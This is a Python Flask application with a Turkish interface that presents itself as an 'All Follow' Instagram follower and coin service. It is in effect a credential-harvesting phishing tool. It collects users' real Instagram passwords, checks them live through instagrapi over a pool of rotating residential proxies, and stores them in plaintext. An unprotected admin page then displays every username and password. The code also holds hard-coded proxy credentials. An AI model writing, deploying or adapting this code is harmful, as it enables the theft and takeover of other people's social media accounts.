import os, random, time
from flask import Flask, request, jsonify, render_template_string, session, redirect
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

app = Flask(__name__)
app.secret_key = "all_follow_v11_fix"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v11.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- VERİTABANI ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=10)
    status = db.Column(db.String(50), default="AKTİF ✅")

class Ticket(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user = db.Column(db.String(100))
    msg = db.Column(db.Text)

# --- PROXY HAVUZU (Hata Veren F-Stringler Temizlendi) ---
PROXY_LIST = [
    "http://pcUjiruWbB-res-tr-sid-92358982:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-37932429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73263145:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84639863:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68182545:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-51767287:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68467738:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-96271173:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-74157191:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-58918651:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68678841:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-46429632:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-17426981:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-21779381:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-14741598:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-15883827:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-16665927:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-77458619:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-71571623:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-54294376:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-78592329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-31866599:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-45714658:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-91245644:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-51887393:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-46967593:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-57524117:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-19727293:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-15366548:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-74662724:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-48619742:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-97373613:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-61915911:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-19745234:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-87154694:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-54643851:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-25397281:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73268429:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-59755624:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-49617699:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-52943223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-68562329:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-62198538:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-42773365:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-73343122:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-49537566:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84759223:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-13543997:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-84282544:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959",
    "http://pcUjiruWbB-res-tr-sid-57134195:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"
]

HTML_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Follow | {{ title }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> body { background: #050505; color: white; font-family: sans-serif; } </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <div class="w-full max-w-md bg-[#111] p-8 rounded-3xl border border-white/5 shadow-2xl">
        <h1 class="text-3xl font-black text-center text-blue-500 mb-8 italic tracking-tighter">ALL FOLLOW</h1>
        {{ body | safe }}
        <div class="mt-10 flex justify-center space-x-6 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
            <a href="/">Giriş</a><a href="/panel">Panel</a><a href="/destek">Destek</a><a href="/admin_ozel">Admin</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    body = """
    <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-4 text-sm outline-none">
    <input id="p" type="password" placeholder="Şifre" class="w-full bg-black border border-white/10 p-4 rounded-xl mb-6 text-sm outline-none">
    <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-black uppercase text-sm">Katıl</button>
    <p id="msg" class="text-xs mt-6 text-center text-gray-400"></p>
    <script>
        async function login(){
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            btn.innerText="DENENİYOR...";
            const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u,p})});
            const d=await r.json();
            msg.innerText=d.msg;
            if(d.status==="success") window.location.href="/panel";
            btn.innerText="Katıl";
        }
    </script>
    """
    return render_template_string(HTML_UI, title="Hoş Geldin", body=body)

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect('/')
    u = User.query.filter_by(username=session['user']).first()
    body = f"""
    <div class="text-center">
        <p class="text-xs text-gray-400 mb-2 italic">@{u.username}</p>
        <div class="bg-blue-600/10 border border-blue-500/20 py-10 rounded-3xl mb-6">
            <h2 class="text-5xl font-black text-blue-500">{u.coins}</h2>
            <p class="text-[10px] font-bold text-blue-300/50 uppercase">All Follow Coin</p>
        </div>
        <button onclick="mine()" class="w-full bg-emerald-600 py-4 rounded-xl font-black mb-4 text-sm">Coin Kas</button>
    </div>
    <script>
        async function mine(){
            const r=await fetch('/api/mine'); const d=await r.json();
            alert(d.msg); location.reload();
        }
    </script>
    """
    return render_template_string(HTML_UI, title="Panel", body=body)

@app.route('/destek', methods=['GET','POST'])
def destek():
    if request.method == 'POST':
        db.session.add(Ticket(user=session.get('user','Anonim'), msg=request.form.get('msg')))
        db.session.commit()
        return redirect('/destek')
    body = """
    <form method="POST" class="space-y-4">
        <textarea name="msg" placeholder="Sorununuz nedir?" class="w-full bg-black border border-white/10 p-4 rounded-xl h-32 text-sm"></textarea>
        <button class="w-full bg-white text-black py-4 rounded-xl font-black uppercase text-sm">Gönder</button>
    </form>
    """
    return render_template_string(HTML_UI, title="Destek", body=body)

@app.route('/admin_ozel')
def admin_ozel():
    users = User.query.all()
    tickets = Ticket.query.all()
    body = "<div class='text-[10px]'>"
    for u in users: body += f"<p>{u.username} | {u.password} | {u.coins}C</p>"
    body += "<hr class='my-4 opacity-10'>"
    for t in tickets: body += f"<p>{t.user}: {t.msg}</p>"
    body += "</div>"
    return render_template_string(HTML_UI, title="Yönetim", body=body)

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    cl = Client()
    cl.request_timeout = 15
    px = random.choice(PROXY_LIST)
    cl.proxies = {"http": px, "https": px}
    try:
        if cl.login(data.get('u'), data.get('p')):
            u = data.get('u')
            user = User.query.filter_by(username=u).first()
            if not user:
                user = User(username=u, password=data.get('p'))
                db.session.add(user)
            db.session.commit()
            session['user'] = u
            return jsonify(status="success", msg="Başarılı! ✅")
    except Exception as e:
        return jsonify(status="error", msg=f"Hata: {str(e)[:40]}")

@app.route('/api/mine')
def api_mine():
    if 'user' not in session: return jsonify(msg="Hata")
    u = User.query.filter_by(username=session['user']).first()
    u.coins += 10
    db.session.commit()
    return jsonify(msg="10 Coin kazandın!")

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=10000)
